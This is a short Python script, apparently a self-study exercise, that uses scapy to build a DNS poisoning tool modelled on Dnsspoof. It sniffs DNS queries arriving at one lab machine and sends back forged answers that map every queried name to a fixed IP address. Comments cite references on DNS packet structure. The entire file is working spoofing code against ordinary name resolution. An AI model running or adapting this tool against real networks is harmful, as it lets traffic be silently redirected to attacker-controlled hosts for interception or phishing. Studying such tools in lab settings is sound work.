#!/usr/local/bin/python

'''
Create a DNS poisoning tool similar to Dnsspoof using scapy
'''

# Good for finding DNS "magic numbers"
# https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml

# Good for understanding the DNS packet structure
# http://blog.catchpoint.com/2014/07/09/dissecting-dns-communications/

# General DNS info (didn't use as much from this resource, but worth a glance)
# http://www.zytrax.com/books/dns/ch8/

# Sample Query
# https://gist.github.com/thepacketgeek/6928674

from scapy.all import *

fake_DNS = "192.168.1.223" # this is the IP of the computer running this script
fake_server = "192.168.2.30" # this is the reply to the DNS query

def DNS_spoof(pkt):
	# http://www.unixwiz.net/images/dns-packet-exchange-step4.gif
	if(pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[DNS].qdcount == 1):
		# basically just flip all the necessary fields from source to response
		response_pkt = IP(dst=pkt[IP].src)/UDP(sport=53, dport=pkt[UDP].sport)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=fake_server))
		print(response_pkt.show())
		send(response_pkt)

sniff(iface="enp0s3", filter="udp port 53 and ip dst {} and not ip src {}".format(fake_DNS,fake_DNS), prn=DNS_spoof, store=0)